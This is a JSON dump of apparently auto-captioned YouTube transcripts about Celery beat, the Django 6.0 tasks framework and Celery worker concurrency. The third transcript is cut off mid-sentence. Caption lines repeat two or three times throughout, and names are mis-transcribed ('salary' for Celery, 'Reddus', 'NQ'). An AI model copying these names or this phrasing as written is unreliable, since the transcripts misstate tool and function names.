It&nbsp;&nbsp;\nholds special database which tracks all entries&nbsp; and sends a message to you at a specific time.&nbsp;&nbsp;\nSo, this way we can schedule&nbsp; our celery tasks to be run at&nbsp;&nbsp;\na specific time. Celery beat allows to do that.\nI hope you enjoyed the&nbsp; video. Thank you for watching"
  },
  {
    "id": 60491643,
    "timestamp": "2026-02-23T00:14:54.679Z",
    "title": "Django 6.0 Just Changed Everything",
    "url": "https://www.youtube.com/watch?v=JCRu3zyMz54",
    "text": "Django just leveled up big time with\nDjango just leveled up big time with 6.0's new Django task framework inside\n6.0's new Django task framework inside\n6.0's new Django task framework inside tasks. This finally gives us a way to\ntasks. This finally gives us a way to\ntasks. This finally gives us a way to define and cue background work. Things\ndefine and cue background work. Things\ndefine and cue background work. Things like sending emails or processing data\nlike sending emails or processing data\nlike sending emails or processing data outside the request response cycle so\noutside the request response cycle so\noutside the request response cycle so users aren't just sitting there waiting.\nusers aren't just sitting there waiting.\nusers aren't just sitting there waiting. For a lot of apps, this might mean you\nFor a lot of apps, this might mean you\nFor a lot of apps, this might mean you don't need salary or full-blown cues\ndon't need salary or full-blown cues\ndon't need salary or full-blown cues just to offload simple jobs. But if\njust to offload simple jobs. But if\njust to offload simple jobs. But if you're doing heavy distributed\nyou're doing heavy distributed\nyou're doing heavy distributed workflows, you may still want those\nworkflows, you may still want those\nworkflows, you may still want those bigger tools. Django 6.0 rolled this out\nbigger tools. Django 6.0 rolled this out\nbigger tools. Django 6.0 rolled this out as part of its December 2025 release. It\nas part of its December 2025 release. It\nas part of its December 2025 release. It rolled out the alpha in September, the\nrolled out the alpha in September, the\nrolled out the alpha in September, the beta in October, and then the RC1 in\nbeta in October, and then the RC1 in\nbeta in October, and then the RC1 in November. So, now we're going to see\nNovember. So, now we're going to see\nNovember. So, now we're going to see what Tasks can do, where it fits, and\nwhat Tasks can do, where it fits, and\nwhat Tasks can do, where it fits, and where it doesn't replace Celery. We have\nwhere it doesn't replace Celery. We have\nwhere it doesn't replace Celery. We have videos coming out all the time. Be sure\nvideos coming out all the time. Be sure\nvideos coming out all the time. Be sure to subscribe.\nNow, rewind. The last couple years,\nNow, rewind. The last couple years, Django devs have been asking for a\nDjango devs have been asking for a\nDjango devs have been asking for a standard built-in way to run background\nstandard built-in way to run background\nstandard built-in way to run background work without committing to a specific\nwork without committing to a specific\nwork without committing to a specific queue. Here enters Jake Howard, a core\nqueue. Here enters Jake Howard, a core\nqueue. Here enters Jake Howard, a core contributor to Django with an accepted\ncontributor to Django with an accepted\ncontributor to Django with an accepted enhancement proposal called Django\nenhancement proposal called Django\nenhancement proposal called Django Tasks, a design for a minimal\nTasks, a design for a minimal\nTasks, a design for a minimal standardized API for tasks and backends.\nstandardized API for tasks and backends.\nstandardized API for tasks and backends. The idea is Django would define how you\nThe idea is Django would define how you\nThe idea is Django would define how you declare and NQ tasks while letting\ndeclare and NQ tasks while letting\ndeclare and NQ tasks while letting different backgrounds actually handle\ndifferent backgrounds actually handle\ndifferent backgrounds actually handle how they're stored and executed. That\nhow they're stored and executed. That\nhow they're stored and executed. That work landed in Django 6.0 as the new\nwork landed in Django 6.0 as the new\nwork landed in Django 6.0 as the new tasks module. The initial implementation\ntasks module. The initial implementation\ntasks module. The initial implementation is intentionally small. It gives you the\nis intentionally small. It gives you the\nis intentionally small. It gives you the decorator, the NQ API, the task result\ndecorator, the NQ API, the task result\ndecorator, the NQ API, the task result abstraction, but it doesn't ship a\nabstraction, but it doesn't ship a\nabstraction, but it doesn't ship a production worker. Now, that's by\nproduction worker. Now, that's by\nproduction worker. Now, that's by design. Django stays lean while the\ndesign. Django stays lean while the\ndesign. Django stays lean while the backends or third party apps fulfill the\nbackends or third party apps fulfill the\nbackends or third party apps fulfill the execution side. So you can think of it\nexecution side. So you can think of it\nexecution side. So you can think of it as an entry ramp, not a celery killer. A\nas an entry ramp, not a celery killer. A\nas an entry ramp, not a celery killer. A common baseline for 80%ish simple\ncommon baseline for 80%ish simple\ncommon baseline for 80%ish simple offload use cases while heavy duty setup\noffload use cases while heavy duty setup\noffload use cases while heavy duty setup still require celery Huey RQ and\nstill require celery Huey RQ and\nstill require celery Huey RQ and friends. Boiled down Django tasks is a\nfriends. Boiled down Django tasks is a\nfriends. Boiled down Django tasks is a pluggable API layer where we can define\npluggable API layer where we can define\npluggable API layer where we can define a task using the tasks decorator. We can\na task using the tasks decorator. We can\na task using the tasks decorator. We can set things like priority and Q name. You\nset things like priority and Q name. You\nset things like priority and Q name. You can mark tasks with takes context to get\ncan mark tasks with takes context to get\ncan mark tasks with takes context to get a task context that exposes things like\na task context that exposes things like\na task context that exposes things like attempt count and the task result ID.\nattempt count and the task result ID.\nattempt count and the task result ID. You can in Q work with the inq function\nYou can in Q work with the inq function\nYou can in Q work with the inq function from sync code or use async with a and\nfrom sync code or use async with a and\nfrom sync code or use async with a and q, but that only depends on how your\nq, but that only depends on how your\nq, but that only depends on how your backend is set up. both return a task\nbackend is set up. both return a task\nbackend is set up. both return a task result which later can be reloaded using\nresult which later can be reloaded using\nresult which later can be reloaded using get results to check for things like\nget results to check for things like\nget results to check for things like errors, status, all that kind of stuff.\nerrors, status, all that kind of stuff.\nerrors, status, all that kind of stuff. Django provides built-in immediate\nDjango provides built-in immediate\nDjango provides built-in immediate backend and dummy backend which never\nbackend and dummy backend which never\nbackend and dummy backend which never actually execute. And then real\nactually execute. And then real\nactually execute. And then real background execution is where putting\nbackground execution is where putting\nbackground execution is where putting jobs in a queue and having workers pick\njobs in a queue and having workers pick\njobs in a queue and having workers pick them up is handled by a backend that you\nthem up is handled by a backend that you\nthem up is handled by a backend that you configure. There's no built-in worker or\nconfigure. There's no built-in worker or\nconfigure. There's no built-in worker or retry system in Django itself. In fact,\nretry system in Django itself. In fact,\nretry system in Django itself. In fact, the docs explicitly state this. You must\nthe docs explicitly state this. You must\nthe docs explicitly state this. You must run something external like a separate\nrun something external like a separate\nrun something external like a separate process to actually handle this. Here we\nprocess to actually handle this. Here we\nprocess to actually handle this. Here we have an actual function itself. And\nhave an actual function itself. And\nhave an actual function itself. And we're using some of the core aspects\nwe're using some of the core aspects\nwe're using some of the core aspects from Django 6. Here I'm using the atomic\nfrom Django 6. Here I'm using the atomic\nfrom Django 6. Here I'm using the atomic method which makes sure that either\nmethod which makes sure that either\nmethod which makes sure that either fully save the order or roll everything\nfully save the order or roll everything\nfully save the order or roll everything back. Then we have something called on\nback. Then we have something called on\nback. Then we have something called on commit. on commit hooks in after the\ncommit. on commit hooks in after the\ncommit. on commit hooks in after the database commit and only then encues one\ndatabase commit and only then encues one\ndatabase commit and only then encues one of your tasks. Here we're using that new\nof your tasks. Here we're using that new\nof your tasks. Here we're using that new inq route that is going to be linked to\ninq route that is going to be linked to\ninq route that is going to be linked to one of our tasks. Now inside tasks, a\none of our tasks. Now inside tasks, a\none of our tasks. Now inside tasks, a task like notify user is going to look\ntask like notify user is going to look\ntask like notify user is going to look something like this. We have our new\nsomething like this. We have our new\nsomething like this. We have our new task decorator linked to it and we're\ntask decorator linked to it and we're\ntask decorator linked to it and we're giving it a few keyword arguments here.\ngiving it a few keyword arguments here.\ngiving it a few keyword arguments here. By giving takes context is true, this\nBy giving takes context is true, this\nBy giving takes context is true, this injects a task context as its first\ninjects a task context as its first\ninjects a task context as its first argument. And so you can access the\nargument. And so you can access the\nargument. And so you can access the attempts, the task result ID, and so\nattempts, the task result ID, and so\nattempts, the task result ID, and so forth. The Q name really just sends this\nforth. The Q name really just sends this\nforth. The Q name really just sends this task to a queue that I'm specifying as\ntask to a queue that I'm specifying as\ntask to a queue that I'm specifying as notifications. And then priority is\nnotifications. And then priority is\nnotifications. And then priority is great. The higher the number, the higher\ngreat. The higher the number, the higher\ngreat. The higher the number, the higher the priority is going to be telling your\nthe priority is going to be telling your\nthe priority is going to be telling your backend. With Django tasks backport on\nbackend. With Django tasks backport on\nbackend. With Django tasks backport on Django 5, I can wire up a tiny status\nDjango 5, I can wire up a tiny status\nDjango 5, I can wire up a tiny status endpoint just like I've done here.\nendpoint just like I've done here.\nendpoint just like I've done here. Require get and we're checking our task\nRequire get and we're checking our task\nRequire get and we're checking our task status. When I incue a task, I'm giving\nstatus. When I incue a task, I'm giving\nstatus. When I incue a task, I'm giving it the result ID that we passed into\nit the result ID that we passed into\nit the result ID that we passed into this. Later when we hit on the URL tasks\nthis. Later when we hit on the URL tasks\nthis. Later when we hit on the URL tasks ID status and this view here gets\nID status and this view here gets\nID status and this view here gets called, it's going to check for things\ncalled, it's going to check for things\ncalled, it's going to check for things like result status. It's going to check\nlike result status. It's going to check\nlike result status. It's going to check for things like is it finished and the\nfor things like is it finished and the\nfor things like is it finished and the return value of this as well as our\nreturn value of this as well as our\nreturn value of this as well as our number of attempts that's all linked\nnumber of attempts that's all linked\nnumber of attempts that's all linked together. Now if we stack it against the\ntogether. Now if we stack it against the\ntogether. Now if we stack it against the big guns Django seems to be better for\nbig guns Django seems to be better for\nbig guns Django seems to be better for minimal dependencies and just that\nminimal dependencies and just that\nminimal dependencies and just that allound Django native feel which we love\nallound Django native feel which we love\nallound Django native feel which we love but Celery is still a killer for\nbut Celery is still a killer for\nbut Celery is still a killer for distributed scale built-in retries but\ndistributed scale built-in retries but\ndistributed scale built-in retries but has steep configs and overhead. QE and\nhas steep configs and overhead. QE and\nhas steep configs and overhead. QE and RQ. Simpler cues, but still extras.\nRQ. Simpler cues, but still extras.\nRQ. Simpler cues, but still extras. Tasks handle 80% use cases, offload\nTasks handle 80% use cases, offload\nTasks handle 80% use cases, offload emails, process uploads, and hit APIs\nemails, process uploads, and hit APIs\nemails, process uploads, and hit APIs without user wait times. According to\nwithout user wait times. According to\nwithout user wait times. According to early write-ups and earlier discussions,\nearly write-ups and earlier discussions,\nearly write-ups and earlier discussions, the new Django tasks framework is great\nthe new Django tasks framework is great\nthe new Django tasks framework is great for about 80% of apps. There's also\nfor about 80% of apps. There's also\nfor about 80% of apps. There's also early talk about celery being presented\nearly talk about celery being presented\nearly talk about celery being presented behind Django Tasks API, but that's\nbehind Django Tasks API, but that's\nbehind Django Tasks API, but that's still in discussion. It's not a part of\nstill in discussion. It's not a part of\nstill in discussion. It's not a part of the core features just yet. All right,\nthe core features just yet. All right,\nthe core features just yet. All right, quick heads up here. This is minimal by\nquick heads up here. This is minimal by\nquick heads up here. This is minimal by design and there's a few things that we\ndesign and there's a few things that we\ndesign and there's a few things that we need to touch on just to clarify this\nneed to touch on just to clarify this\nneed to touch on just to clarify this now. Number one, there's no built-in\nnow. Number one, there's no built-in\nnow. Number one, there's no built-in worker. Django just defines tasks and Q\nworker. Django just defines tasks and Q\nworker. Django just defines tasks and Q interaction. You still need a separate\ninteraction. You still need a separate\ninteraction. You still need a separate process like a Django tasks worker.\nprocess like a Django tasks worker.\nprocess like a Django tasks worker. Number two, there's no built-in retries,\nNumber two, there's no built-in retries,\nNumber two, there's no built-in retries, schedules, or chains here. Those\nschedules, or chains here. Those\nschedules, or chains here. Those features live in your backend or third\nfeatures live in your backend or third\nfeatures live in your backend or third party tooling, not in Django tasks\nparty tooling, not in Django tasks\nparty tooling, not in Django tasks itself. And then we have some caveats\nitself. And then we have some caveats\nitself. And then we have some caveats with the whole serialization thing that\nwith the whole serialization thing that\nwith the whole serialization thing that we need to watch out for. arguments and\nwe need to watch out for. arguments and\nwe need to watch out for. arguments and return values, they must be JSON\nreturn values, they must be JSON\nreturn values, they must be JSON friendly. And if there's any gaps in\nfriendly. And if there's any gaps in\nfriendly. And if there's any gaps in these areas, communities are already\nthese areas, communities are already\nthese areas, communities are already building and dropping Reddus adapters to\nbuilding and dropping Reddus adapters to\nbuilding and dropping Reddus adapters to close them. Looking ahead for Django,\nclose them. Looking ahead for Django,\nclose them. Looking ahead for Django, this is great because it now means they\nthis is great because it now means they\nthis is great because it now means they have a standard background tasks API\nhave a standard background tasks API\nhave a standard background tasks API built into the core. There's active\nbuilt into the core. There's active\nbuilt into the core. There's active discussion about better monitoring and\ndiscussion about better monitoring and\ndiscussion about better monitoring and signaling around task life cycle, more\nsignaling around task life cycle, more\nsignaling around task life cycle, more polished backends for Reddus and RQ\npolished backends for Reddus and RQ\npolished backends for Reddus and RQ bridges that let libraries like Celery\nbridges that let libraries like Celery\nbridges that let libraries like Celery speak, the Django tasks interface, but\nspeak, the Django tasks interface, but\nspeak, the Django tasks interface, but these are community experiments and just\nthese are community experiments and just\nthese are community experiments and just overall discussion. It doesn't actually\noverall discussion. It doesn't actually\noverall discussion. It doesn't actually mean anything for the road map. If\nmean anything for the road map. If\nmean anything for the road map. If you're still on Django 5, the backend\nyou're still on Django 5, the backend\nyou're still on Django 5, the backend port still allows you to try out this\nport still allows you to try out this\nport still allows you to try out this API while you migrate everything into\nAPI while you migrate everything into\nAPI while you migrate everything into Django 6. What do we think? Is the\nDjango 6. What do we think? Is the\nDjango 6. What do we think? Is the Django 6 hype justified? It's simple.\nDjango 6 hype justified? It's simple.\nDjango 6 hype justified? It's simple. It's powerful. Seems to be future proof.\nIt's powerful. Seems to be future proof.\nIt's powerful. Seems to be future proof. At least that's what the devs were going\nAt least that's what the devs were going\nAt least that's what the devs were going for. Try jumping into the RC docs. Test\nfor. Try jumping into the RC docs. Test\nfor. Try jumping into the RC docs. Test it out on one of your projects. We'll\nit out on one of your projects. We'll\nit out on one of your projects. We'll see you in another"
  },
  {
    "id": 60491646,
    "timestamp": "2026-02-23T00:14:54.755Z",
    "title": "Python Celery Explained 🤯",
    "url": "https://www.youtube.com/watch?v=Rr4CW2quazA",
    "text": "We've all been there, right? You build a\nWe've all been there, right? You build a Python app, it's working great, but then\nPython app, it's working great, but then\nPython app, it's working great, but then you add a feature that takes a long time\nyou add a feature that takes a long time\nyou add a feature that takes a long time to run, and the whole thing just\nto run, and the whole thing just\nto run, and the whole thing just freezes. It's incredibly frustrating.\nfreezes. It's incredibly frustrating.\nfreezes. It's incredibly frustrating. Well, today we're diving into Celery,\nWell, today we're diving into Celery,\nWell, today we're diving into Celery, the tool that's designed to solve\nthe tool that's designed to solve\nthe tool that's designed to solve exactly that problem by pushing those\nexactly that problem by pushing those\nexactly that problem by pushing those heavy jobs into the background so your\nheavy jobs into the background so your\nheavy jobs into the background so your app stays zippy and responsive for\napp stays zippy and responsive for\napp stays zippy and responsive for everyone. So, let's set the scene.\neveryone. So, let's set the scene.\neveryone. So, let's set the scene. Imagine a user is on your web app. They\nImagine a user is on your web app. They\nImagine a user is on your web app. They click a button, something like generate\nclick a button, something like generate\nclick a button, something like generate report. They're sitting there waiting,\nreport. They're sitting there waiting,\nreport. They're sitting there waiting, expecting something to happen pretty\nexpecting something to happen pretty\nexpecting something to happen pretty quickly. But instead, they just get a\nquickly. But instead, they just get a\nquickly. But instead, they just get a loading spinner and it keeps spinning.\nloading spinner and it keeps spinning.\nloading spinner and it keeps spinning. And the worst part, it's not just them.\nAnd the worst part, it's not just them.\nAnd the worst part, it's not just them. Your entire application is now bogged\nYour entire application is now bogged\nYour entire application is now bogged down, completely stuck on that one task.\ndown, completely stuck on that one task.\ndown, completely stuck on that one task. So, what's going on here? And more\nSo, what's going on here? And more\nSo, what's going on here? And more importantly, how do we fix it? That's\nimportantly, how do we fix it? That's\nimportantly, how do we fix it? That's exactly what we're about to break down.\nexactly what we're about to break down.\nexactly what we're about to break down. The answer is to stop making the user\nThe answer is to stop making the user\nThe answer is to stop making the user wait. We need to handle that heavy task\nwait. We need to handle that heavy task\nwait. We need to handle that heavy task somewhere else in the background. And\nsomewhere else in the background. And\nsomewhere else in the background. And that brings us to the star of our show,\nthat brings us to the star of our show,\nthat brings us to the star of our show, Python Celery. So let's start with the\nPython Celery. So let's start with the\nPython Celery. So let's start with the big idea. So what is Celery really? The\nbig idea. So what is Celery really? The\nbig idea. So what is Celery really? The best way to think about it is as a\nbest way to think about it is as a\nbest way to think about it is as a dedicated helper for your main\ndedicated helper for your main\ndedicated helper for your main application. It takes on all the\napplication. It takes on all the\napplication. It takes on all the time-consuming jobs like generating that\ntime-consuming jobs like generating that\ntime-consuming jobs like generating that report or sending a thousand emails. So\nreport or sending a thousand emails. So\nreport or sending a thousand emails. So your main app can stay free to just, you\nyour main app can stay free to just, you\nyour main app can stay free to just, you know, serve web pages to other users. It\nknow, serve web pages to other users. It\nknow, serve web pages to other users. It manages all this with what's called a\nmanages all this with what's called a\nmanages all this with what's called a distributed task queue, which is really\ndistributed task queue, which is really\ndistributed task queue, which is really just a fancy way of saying it's a system\njust a fancy way of saying it's a system\njust a fancy way of saying it's a system for handing out jobs. Now you might be\nfor handing out jobs. Now you might be\nfor handing out jobs. Now you might be thinking this sounds complicated, but\nthinking this sounds complicated, but\nthinking this sounds complicated, but what's a task in celeries world? It's\nwhat's a task in celeries world? It's\nwhat's a task in celeries world? It's ridiculously simple. A task is just a\nridiculously simple. A task is just a\nridiculously simple. A task is just a Python function. That's it. That\nPython function. That's it. That\nPython function. That's it. That generate report function you wrote,\ngenerate report function you wrote,\ngenerate report function you wrote, that's a perfect celery task. Okay, but\nthat's a perfect celery task. Okay, but\nthat's a perfect celery task. Okay, but how does your app actually hand off that\nhow does your app actually hand off that\nhow does your app actually hand off that function to be run somewhere else? It\nfunction to be run somewhere else? It\nfunction to be run somewhere else? It uses something called a broker. Think of\nuses something called a broker. Think of\nuses something called a broker. Think of the broker like a mail room. Your\nthe broker like a mail room. Your\nthe broker like a mail room. Your application drops off a message that\napplication drops off a message that\napplication drops off a message that says, \"Hey, please run this task with\nsays, \"Hey, please run this task with\nsays, \"Hey, please run this task with these arguments.\" and the broker holds\nthese arguments.\" and the broker holds\nthese arguments.\" and the broker holds on to it. Really popular choices for\non to it. Really popular choices for\non to it. Really popular choices for this are tools like Rabbit MQ or Reddus.\nthis are tools like Rabbit MQ or Reddus.\nthis are tools like Rabbit MQ or Reddus. And who's on the other end picking up\nAnd who's on the other end picking up\nAnd who's on the other end picking up the mail from the mail room? That would\nthe mail from the mail room? That would\nthe mail from the mail room? That would be the worker. A celery worker is a\nbe the worker. A celery worker is a\nbe the worker. A celery worker is a totally separate program. It's just\ntotally separate program. It's just\ntotally separate program. It's just running in the background, constantly\nrunning in the background, constantly\nrunning in the background, constantly watching the broker for new messages.\nwatching the broker for new messages.\nwatching the broker for new messages. When it sees one, it grabs the task and\nWhen it sees one, it grabs the task and\nWhen it sees one, it grabs the task and gets to work. This guy is the real\ngets to work. This guy is the real\ngets to work. This guy is the real workhorse of the whole system. But wait\nworkhorse of the whole system. But wait\nworkhorse of the whole system. But wait a second, what if you need to know when\na second, what if you need to know when\na second, what if you need to know when that report is done or even get the\nthat report is done or even get the\nthat report is done or even get the final report file? That's where the\nfinal report file? That's where the\nfinal report file? That's where the optional result backend comes into play.\noptional result backend comes into play.\noptional result backend comes into play. It's basically a storage space like a\nIt's basically a storage space like a\nIt's basically a storage space like a database where a worker can post the\ndatabase where a worker can post the\ndatabase where a worker can post the results of a job so your main\nresults of a job so your main\nresults of a job so your main application can check in on the status\napplication can check in on the status\napplication can check in on the status or grab the final output later. All\nor grab the final output later. All\nor grab the final output later. All right, so we've got the main players\nright, so we've got the main players\nright, so we've got the main players down, the app, the broker, the worker,\ndown, the app, the broker, the worker,\ndown, the app, the broker, the worker, and the back end. Now, let's pop the\nand the back end. Now, let's pop the\nand the back end. Now, let's pop the hood and get into the engine room to see\nhood and get into the engine room to see\nhood and get into the engine room to see how these workers actually get things\nhow these workers actually get things\nhow these workers actually get things done. Now, here's something that\ndone. Now, here's something that\ndone. Now, here's something that surprises a lot of people. The main\nsurprises a lot of people. The main\nsurprises a lot of people. The main celery worker process doesn't actually\ncelery worker process doesn't actually\ncelery worker process doesn't actually run your tasks itself. Nope. It's a\nrun your tasks itself. Nope. It's a\nrun your tasks itself. Nope. It's a manager. Its job is to connect the\nmanager. Its job is to connect the\nmanager. Its job is to connect the broker, pull down jobs, and then hand\nbroker, pull down jobs, and then hand\nbroker, pull down jobs, and then hand them off to a pool of child processes\nthem off to a pool of child processes\nthem off to a pool of child processes that do the real heavy lifting in\nthat do the real heavy lifting in\nthat do the real heavy lifting in parallel. And you control the size of\nparallel. And you control the size of\nparallel. And you control the size of that pool with the Dash concurrency\nthat pool with the Dash concurrency\nthat pool with the Dash concurrency flag. But here's a huge gotcha. You've\nflag. But here's a huge gotcha. You've\nflag. But here's a huge gotcha. You've got to remember this. Setting dash\ngot to remember this. Setting dash\ngot to remember this. Setting dash concurrency equal to four does not mean\nconcurrency equal to four does not mean\nconcurrency equal to four does not mean you get four processes. It means you get\nyou get four processes. It means you get\nyou get four processes. It means you get one manager plus four child workers for\none manager plus four child workers for\none manager plus four child workers for grand total of five processes. Knowing\ngrand total of five processes. Knowing\ngrand total of five processes. Knowing that is absolutely crucial when you're\nthat is absolutely crucial when you're\nthat is absolutely crucial when you're thinking about how much memory and CPU\nthinking about how much memory and CPU\nthinking about how much memory and CPU your server is using. This brings up a\nyour server is using. This brings up a\nyour server is using. This brings up a super important question. Let's say your\nsuper important question. Let's say your\nsuper important question. Let's say your machine has 8 CPU cores. What happens if\nmachine has 8 CPU cores. What happens if\nmachine has 8 CPU cores. What happens if you get a little ambitious and set your\nyou get a little ambitious and set your\nyou get a little ambitious and set your concurrency to say 16? Are you going to\nconcurrency to say 16? Are you going to\nconcurrency to say 16? Are you going to get twice the performance?\nget twice the performance?\nget twice the performance? Not quite. This is where we run into a\nNot quite. This is where we run into a\nNot quite. This is where we run into a bottleneck called context switching. Let\nbottleneck called context switching. Let\nbottleneck called context switching. Let me give you an analogy. Imagine you have\nme give you an analogy. Imagine you have\nme give you an analogy. Imagine you have eight chefs in a kitchen. Those are your\neight chefs in a kitchen. Those are your\neight chefs in a kitchen. Those are your CPU cores. If you give them eight pots\nCPU cores. If you give them eight pots\nCPU cores. If you give them eight pots to stir, everything is great. But if you\nto stir, everything is great. But if you\nto stir, everything is great. But if you give them 16 pots, now each chef is\ngive them 16 pots, now each chef is\ngive them 16 pots, now each chef is frantically jumping between two pots,\nfrantically jumping between two pots,\nfrantically jumping between two pots, right? All that time they spend\nright? All that time they spend\nright? All that time they spend switching from one pot to another is\nswitching from one pot to another is\nswitching from one pot to another is wasted time. The same thing happens with\nwasted time. The same thing happens with\nwasted time. The same thing happens with your CPU. Understanding that wasted time\nyour CPU. Understanding that wasted time\nyour CPU. Understanding that wasted time is the secret to optimizing your\nis the secret to optimizing your\nis the secret to optimizing your performance. Because here's the thing,\nperformance. Because here's the thing,\nperformance. Because here's the thing, the perfect number of pots for your\nthe perfect number of pots for your\nthe perfect number of pots for your chefs completely depends on what you're\nchefs completely depends on what you're\nchefs completely depends on what you're cooking. This brings us to a really\ncooking. This brings us to a really\ncooking. This brings us to a really critical distinction. CPUbound versus\ncritical distinction. CPUbound versus\ncritical distinction. CPUbound versus IObounds tasks. This right here is\nIObounds tasks. This right here is\nIObounds tasks. This right here is basically the cheat sheet for celery\nbasically the cheat sheet for celery\nbasically the cheat sheet for celery performance. For CPUbound tasks, we're\nperformance. For CPUbound tasks, we're\nperformance. For CPUbound tasks, we're talking heavy duty math, image\ntalking heavy duty math, image\ntalking heavy duty math, image processing, that kind of stuff. The best\nprocessing, that kind of stuff. The best\nprocessing, that kind of stuff. The best concurrency setting is right around the\nconcurrency setting is right around the\nconcurrency setting is right around the number of CPU cores you have. One chef,\nnumber of CPU cores you have. One chef,\nnumber of CPU cores you have. One chef, one pot. But for IObound tasks, things\none pot. But for IObound tasks, things\none pot. But for IObound tasks, things that just wait around for a network call\nthat just wait around for a network call\nthat just wait around for a network call or a database query to finish, you can\nor a database query to finish, you can\nor a database query to finish, you can crank that concurrency way, way higher\ncrank that concurrency way, way higher\ncrank that concurrency way, way higher than your number of cores. So what\nthan your number of cores. So what\nthan your number of cores. So what gives? Why the huge difference? Why is\ngives? Why the huge difference? Why is\ngives? Why the huge difference? Why is it totally fine for a chef to juggle a\nit totally fine for a chef to juggle a\nit totally fine for a chef to juggle a dozen pots if they're just waiting for\ndozen pots if they're just waiting for\ndozen pots if they're just waiting for water to boil, but a total disaster if\nwater to boil, but a total disaster if\nwater to boil, but a total disaster if they're trying to actively chop\nthey're trying to actively chop\nthey're trying to actively chop vegetables for all 12 at once? It all\nvegetables for all 12 at once? It all\nvegetables for all 12 at once? It all comes down to one little thing, idle\ncomes down to one little thing, idle\ncomes down to one little thing, idle time. With a CPUbound task, that CPU is\ntime. With a CPUbound task, that CPU is\ntime. With a CPUbound task, that CPU is pinned at 100%. It is always busy. So\npinned at 100%. It is always busy. So\npinned at 100%. It is always busy. So any time spent switching tasks is a\nany time spent switching tasks is a\nany time spent switching tasks is a waste. But with an IObound task, the CPU\nwaste. But with an IObound task, the CPU\nwaste. But with an IObound task, the CPU is just sitting there most of the time\nis just sitting there most of the time\nis just sitting there most of the time twiddling its thumbs waiting for the\ntwiddling its thumbs waiting for the\ntwiddling its thumbs waiting for the network. So while one process is\nnetwork. So while one process is\nnetwork. So while one process is waiting, the CPU can switch over to\nwaiting, the CPU can switch over to\nwaiting, the CPU can switch over to another one and get some real work done.\nanother one and get some real work done.\nanother one and get some real work done. The switching is free because it happens\nThe switching is free because it happens\nThe switching is free because it happens during what would have been wasted time\nduring what would have been wasted time\nduring what would have been wasted time anyway. Okay, so you've totally\nanyway. Okay, so you've totally\nanyway. Okay, so you've totally optimized your single worker on your\noptimized your single worker on your\noptimized your single worker on your single machine. Your kitchen is running\nsingle machine. Your kitchen is running\nsingle machine. Your kitchen is running perfectly. But what happens when your\nperfectly. But what happens when your\nperfectly. But what happens when your app becomes a massive success? Well,\napp becomes a massive success? Well,\napp becomes a massive success? Well, it's time to scale up from a single\nit's time to scale up from a single\nit's time to scale up from a single kitchen to a whole restaurant chain.\nkitchen to a whole restaurant chain.\nkitchen to a whole restaurant chain. Running multiple worker processes, maybe\nRunning multiple worker processes, maybe\nRunning multiple worker processes, maybe even on totally different machines,\neven on totally different machines,\neven on totally different machines, gives you three massive advantages. The\ngives you three massive advantages. The\ngives you three massive advantages. The first one is obvious scalability. You\nfirst one is obvious scalability. You\nfirst one is obvious scalability. You can just handle way more tasks. The\ncan just handle way more tasks. The\ncan just handle way more tasks. The second is specialization where you can\nsecond is specialization where you can\nsecond is specialization where you can have certain workers that only handle\nhave certain workers that only handle\nhave certain workers that only handle certain kinds of jobs. And third, you\ncertain kinds of jobs. And third, you\ncertain kinds of jobs. And third, you get fault tolerance. If one of your\nget fault tolerance. If one of your\nget fault tolerance. If one of your worker machines goes down, the others\nworker machines goes down, the others\nworker machines goes down, the others just pick up the slack. No big deal. And\njust pick up the slack. No big deal. And\njust pick up the slack. No big deal. And that restaurant analogy really helps\nthat restaurant analogy really helps\nthat restaurant analogy really helps clarify the two different ways you can\nclarify the two different ways you can\nclarify the two different ways you can scale. Bumping up your concurrency is\nscale. Bumping up your concurrency is\nscale. Bumping up your concurrency is like hiring more chefs in your one\nlike hiring more chefs in your one\nlike hiring more chefs in your one kitchen. It helps for sure, but\nkitchen. It helps for sure, but\nkitchen. It helps for sure, but eventually the kitchen just gets too\neventually the kitchen just gets too\neventually the kitchen just gets too crowded. To really scale, you have to\ncrowded. To really scale, you have to\ncrowded. To really scale, you have to open more restaurants. In other words,\nopen more restaurants. In other words,\nopen more restaurants. In other words, add more worker machines. That's\nadd more worker machines. That's\nadd more worker machines. That's horizontal scaling. And this idea of\nhorizontal scaling. And this idea of\nhorizontal scaling. And this idea of specialization, what we call task\nspecialization, what we call task\nspecialization, what we call task routing, is incredibly powerful. Check\nrouting, is incredibly powerful. Check\nrouting, is incredibly powerful. Check this out. On the left, we might have a\nthis out. On the left, we might have a\nthis out. On the left, we might have a powerful machine with low concurrency,\npowerful machine with low concurrency,\npowerful machine with low concurrency, maybe just four, that only listens to\nmaybe just four, that only listens to\nmaybe just four, that only listens to the priority queue for urgent jobs. On\nthe priority queue for urgent jobs. On\nthe priority queue for urgent jobs. On the right, we could have a cheaper\nthe right, we could have a cheaper\nthe right, we could have a cheaper machine with super high concurrency,\nmachine with super high concurrency,\nmachine with super high concurrency, like 12, that just chews through all the\nlike 12, that just chews through all the\nlike 12, that just chews through all the low priority bulk tasks. This is a total\nlow priority bulk tasks. This is a total\nlow priority bulk tasks. This is a total game changer for building really robust\ngame changer for building really robust\ngame changer for building really robust systems. Now, this all sounds fantastic,\nsystems. Now, this all sounds fantastic,\nsystems. Now, this all sounds fantastic, but before you run off and start\nbut before you run off and start\nbut before you run off and start spinning up dozens of workers, let's\nspinning up dozens of workers, let's\nspinning up dozens of workers, let's talk about planning and a very common\ntalk about planning and a very common\ntalk about planning and a very common pitfall that catches almost everybody by\npitfall that catches almost everybody by\npitfall that catches almost everybody by surprise. Memory usage. Okay, remember\nsurprise. Memory usage. Okay, remember\nsurprise. Memory usage. Okay, remember that worker with a concurrency of eight?\nthat worker with a concurrency of eight?\nthat worker with a concurrency of eight? We said that's nine total processes,\nWe said that's nine total processes,\nWe said that's nine total processes, right? One manager, eight kids. Now,\nright? One manager, eight kids. Now,\nright? One manager, eight kids. Now, let's say your application's code takes\nlet's say your application's code takes\nlet's say your application's code takes up 100 megabytes of RAM. Well, each of\nup 100 megabytes of RAM. Well, each of\nup 100 megabytes of RAM. Well, each of those nine processes loads its own copy\nthose nine processes loads its own copy\nthose nine processes loads its own copy of that code. You do the math. That's\nof that code. You do the math. That's\nof that code. You do the math. That's 900 megabytes of memory for just one\n900 megabytes of memory for just one\n900 megabytes of memory for just one worker. And that number can get out of\nworker. And that number can get out of\nworker. And that number can get out of control very, very quickly. So, how do\ncontrol very, very quickly. So, how do\ncontrol very, very quickly. So, how do we fix this? Luckily, there are a few\nwe fix this? Luckily, there are a few\nwe fix this? Luckily, there are a few tricks. First, you can use lazy imports\ntricks. First, you can use 